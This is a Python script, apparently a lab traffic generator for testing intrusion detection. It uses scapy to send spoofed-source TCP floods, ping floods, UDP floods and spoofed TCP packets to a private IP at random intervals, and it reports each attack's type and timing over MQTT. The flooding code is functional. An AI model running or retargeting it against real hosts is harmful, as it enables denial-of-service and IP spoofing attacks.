import random
from time import sleep
import paho.mqtt.client as mqtt

from scapy.all import IP, TCP, send, ICMP, UDP
import uuid


def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.connect("192.168.1.18", 1883, 60)

def send_attack_notification(attack_type, attack_id, is_start=True):
    message = f"{attack_type}:{attack_id}{':start' if is_start else ':end'}"
    client.publish("attack/type", message)
    print(f"Sent notification for {message}")

def simulate_attack(target_ip):
    attack_type = random.choice(['ddos', 'ping_flood', 'mitm', 'udp_flood'])
    attack_id = str(uuid.uuid4())  # Générer un ID unique pour cette attaque
    print(f"Simulating {attack_type.upper()} attack with ID {attack_id}")

    send_attack_notification(attack_type, attack_id, is_start=True)

    if attack_type == 'ddos':
        nombre_paquets = random.randint(100, 5000)
        print(nombre_paquets)
        for _ in range(nombre_paquets):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    elif attack_type == 'ping_flood':
        nombre_paquets = random.randint(100, 2000)
        print("Simulating Ping Flood")
        for _ in range(nombre_paquets):  # Augmente le nombre de pings pour simuler un flood
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=0)

    elif attack_type == "mitm":
        random_number = random.randint(1, 253)
        victim_ip = f"192.168.3.{random_number}"
        nombre_paquets = random.randint(50, 500)
        for _ in range(nombre_paquets):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            # Falsification des adresses IP pour imiter l'IP de la victime
            if random.random() > 0.5:
                packet = IP(src=victim_ip, dst=target_ip) / TCP(seq=random.randint(1000, 10000),
                                                                ack=random.randint(1000, 10000))
            else:
                packet = IP(src=target_ip, dst=victim_ip) / TCP(seq=random.randint(1000, 10000),
                                                                ack=random.randint(1000, 10000))
            send(packet, verbose=0)

    elif attack_type == 'udp_flood':
        nombre_paquets = random.randint(100, 2000)
        print("Simulating UDP Flood")
        for _ in range(nombre_paquets):
            packet = IP(dst=target_ip) / UDP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    send_attack_notification(attack_type, attack_id, is_start=False)

if __name__ == "__main__":
    target_ip = "192.168.1.18"
    try:
        while True:
            simulate_attack(target_ip)
            sleep_time = random.randint(45, 120)
            print(f"Waiting {sleep_time} seconds before next attack")
            sleep(sleep_time)
    except KeyboardInterrupt:
        print("Simulation stopped by user.")
